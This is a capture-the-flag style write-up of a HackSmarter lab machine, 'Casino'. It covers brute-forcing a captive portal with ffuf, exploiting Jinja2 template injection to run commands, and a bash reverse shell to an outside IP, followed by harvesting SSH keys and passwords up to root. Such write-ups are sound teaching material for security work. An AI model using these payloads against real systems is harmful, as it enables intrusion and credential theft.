---
title: 'HackSmarter: Casino'
date: 2026-09-02
excerpt: Las Vegas is gearing up for a massive cybersecurity conference, and you've been hired to conduct a penetration test against one of the casinos. The client - Hack Smarter World - is a luxury resort where many of the attendees will be staying. Your objective is to identify all vulnerabilities and elevate your privileges to root (if possible).
readingTime: 1
tags:
  - Writeup
  - hacksmarter
  - Linux
  - Web
  - Medium
author: pir4cy
coverImage: /images/writeups/covers/hacksmarter/hacksmarter-casino-cover.png
draft: false
---

# Casino

## Objective

Las Vegas is gearing up for a massive cybersecurity conference, and you've been hired to conduct a penetration test against one of the casinos. The client - Hack Smarter World - is a luxury resort where many of the attendees will be staying. Your objective is to identify all vulnerabilities and elevate your privileges to root (if possible).

## Initial Access

You have been provided the IP of the Wifi Captive Portal... but no other information.

## Recon

We just have the IP Address of the WiFi Captive Portal. Let's run a quick nmap scan to identify open ports and services:

```
nmap -T4 -A 10.0.23.114 -p- -oA casino  
```


![HackSmarter Nmap](/images/writeups/machines/hacksmarter/HackSmarter%20-%20Casino/nmap.png "Nmap")

Nothing much of note, however we did find out that the web portal is a Python server.

```
80/tcp   open  http    Werkzeug httpd 3.1.8 (Python 3.10.18)
```

## Enumeration

Let's navigate to the hosted web server and see what's in store for us.  
![Web Portal](/images/writeups/machines/hacksmarter/HackSmarter%20-%20Casino/web-portal-1.png "Web Portal")

So we basically need a room number and guest name to connect. Right off the bat, I want to brute force this page, since room numbers will be incremental and we can use a wordlist for the `Guest Last Name` field.

Since brute force attacks are usually very noisy, let's keep that as a worst case scenario and enumerate the website further.

### Analyzing with BurpSuite

With any web app, I find it useful to keep Burp running as I enumerate the website. This allows me to use the app like a regular user and then go to Burp and go through the requests at a later time.

#### Data Exposure

In the case of this portal, there's an interesting `app.min.js` file that is being picked up.  
![Burp 1](/images/writeups/machines/hacksmarter/HackSmarter%20-%20Casino/burp-1.png "Burp 1")

Forward to Repeater (ctrl+r) and let's see what we get from this JS file:  
![Burp 2](/images/writeups/machines/hacksmarter/HackSmarter%20-%20Casino/burp-2.png "Burp 2")

Another one to explore further:  
![Burp 3](/images/writeups/machines/hacksmarter/HackSmarter%20-%20Casino/burp-3.png "Burp 3")

Looks like this is an internal API helper that verifies whether the room is occupied or not. It's likely that the portal uses this script to check whether the entered information is accurate. Internal endpoints usually do not have any authentication as they are only meant to be accessed internally. Hopefully, this one is also not protected.

Let's send a request to this API endpoint and see what we get:  
![Burp 4](/images/writeups/machines/hacksmarter/HackSmarter%20-%20Casino/burp-4.png "Burp 4")

We have the list of all occupied rooms, along with Guest information. Now we can login easily!

#### Brute Force Method

As mentioned earlier, the most noisy method we have is brute forcing the login page. Although we got the information we needed through enumeration and source code review, I'm just going to write about this method for the curious folk.

Let's start with sending a test login:  
![Burp 5](/images/writeups/machines/hacksmarter/HackSmarter%20-%20Casino/burp-5.png "Burp 5")

So we need to fuzz the fields `room_number` and `last_name`.  
If you have BurpSuite Pro, you can do this directly from Intruder and call it a day. The community version however is throttled, so I'm going to jump to the CLI and use good ol' [`FFUF`](https://github.com/ffuf/ffuf "https://github.com/ffuf/ffuf").

1. Save the request locally and replace the parameters with your fuzz variables, i.e., the request should end with  
    `room_number=ROOM&last_name=LNAME`.  
    We will use these variables when launching our attack.
2. Let's generate a quick numbered wordlist for room numbers. To save time, I will only do 101-200

```
python3 -c 'for i in range(101,200): print(i)' > room1.txt
```

3. The next part is running ffuf with the required wordlists and watching the magic happen.

```
ffuf -request login-req.txt -w room1.txt:ROOM -w /usr/share/wordlists/seclists/Usernames/Names/familynames-usa-top1000.txt:LNAME -request-proto http -mode clusterbomb -mc 302
```

Quick explanation of the flags used:

- `-request`: Used to pass a request file that contains headers and details about our request. The request file should have at least 1 `FUZZ` variable.
- `-w`: Used to tell ffuf what wordlist to use. Notice that we have the name of our variable at the end of the wordlist separated by `:` (ROOM & LNAME). Each wordlist needs to be passed separately.
- `-request-proto`: Used to tell ffuf what protocol to use. By default, ffuf will try to use https so we need to explicitly mention http here.
- `-mode`: Similar to attack modes in Burp, ffuf supports multiple attack modes. In our case, I'm using `clusterbomb` as we need to try a combination of each room number with each user.
- `-mc`: Stands for match code. From Burp, we know that a failed login also gives us a `200 OK`. Therefore, I'm using mc to identify requests that result in redirection (aka login success)

Once we run the above command, we start seeing successful logins come up:  
![FFUF](/images/writeups/machines/hacksmarter/HackSmarter%20-%20Casino/ffuf-1.png "FFUF")

Voila! With both methods, we have occupied rooms and their last names. We can now login to the portal and move further.

### Authenticated Web Portal

#### /dashboard

We are faced with a static portal, without a lot of functionality.  
![Dashboard](/images/writeups/machines/hacksmarter/HackSmarter%20-%20Casino/dashboard-1.png "Dashboard")

There's some information about VLANs and membership tiers but nothing much stands out here.

Let's take a look at Settings

#### /profile

![Profile 1](/images/writeups/machines/hacksmarter/HackSmarter%20-%20Casino/profile-1.png "Profile 1")
Looks like we can make changes to the display name here.

![Profile 2](/images/writeups/machines/hacksmarter/HackSmarter%20-%20Casino/profile-2.png "Profile 2")

Name change worked and it was reflected right there on the page.

### SSTI

Since we already know that this is a Flask application, my instinct is to try the classic Flask injection `{{7*7}}` and see whether my input is being passed through Jinja2 or just being rendered as plaintext.

![SSTI 1](/images/writeups/machines/hacksmarter/HackSmarter%20-%20Casino/ssti-1.png "SSTI 1")
With that we have Server Side Template Injection on this app. We may be able to now achieve RCE and eventually pop a shell.

## Exploitation

Now that we have SSTI, we can go ahead and try to achieve RCE.

Initial Payload:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }} 
```

![SSTI 2](/images/writeups/machines/hacksmarter/HackSmarter%20-%20Casino/ssti-2.png "SSTI 2")

Let's try a reverse shell now. You can generate a payload at [revshells.com] ([https://www.revshells.com](https://www.revshells.com "https://www.revshells.com")).

Replace 'id' with `'bash -c "bash -i >& /dev/tcp/10.200.88.128/9001 0>&1"'`  
![SSTI 3](/images/writeups/machines/hacksmarter/HackSmarter%20-%20Casino/ssti-3.png "SSTI 3")

Before hitting save, make sure to have a listener ready. I"m using penelope to get a stable shell.  
![Shell 1](/images/writeups/machines/hacksmarter/HackSmarter%20-%20Casino/shell-1.png "Shell 1")

## Post Exploitation

As `www-data`, we are able to read the home directories of users `david` & `george` :  
![Shell 2](/images/writeups/machines/hacksmarter/HackSmarter%20-%20Casino/shell-2.png "Shell 2")

At this point, we can grab `user.txt` and the ssh keys for `george`.

### User - george

With penelope, you can just download files directly from your session.  
Press F12 to detach and then simply  
![Penelope](/images/writeups/machines/hacksmarter/HackSmarter%20-%20Casino/penelope-1.png "Penelope")

Now let's try to connect to the box as george.  
![Shell as George](/images/writeups/machines/hacksmarter/HackSmarter%20-%20Casino/shell2-george.png "Shell as George")

Port 22 didn't work but port 2222 worked :D

Looking around, we see some interesting strings in `george`'s bash_history:  
![George Bash History](/images/writeups/machines/hacksmarter/HackSmarter%20-%20Casino/george-bash-history.png "George Bash History")

### User - david

With the password in hand, we can now login as david:  
![Login as David](/images/writeups/machines/hacksmarter/HackSmarter%20-%20Casino/login-as-david.png "Login as David")

From `george`'s bash_history we also see an interesting file: `cat /var/log/provisioning.log`

Opening the file, we get the root password:  
![Rooted](/images/writeups/machines/hacksmarter/HackSmarter%20-%20Casino/casino-rooted.png "Rooted")


## Final Thoughts
I had a great time rooting this machine. The environment felt realistic and from what I've heard, this was built off of a real engagement. So kudos to HSM for building a great challenge!

I will probably do more HackSmarter machines in the future. I can only imagine what their Hard machines and ranges are like. 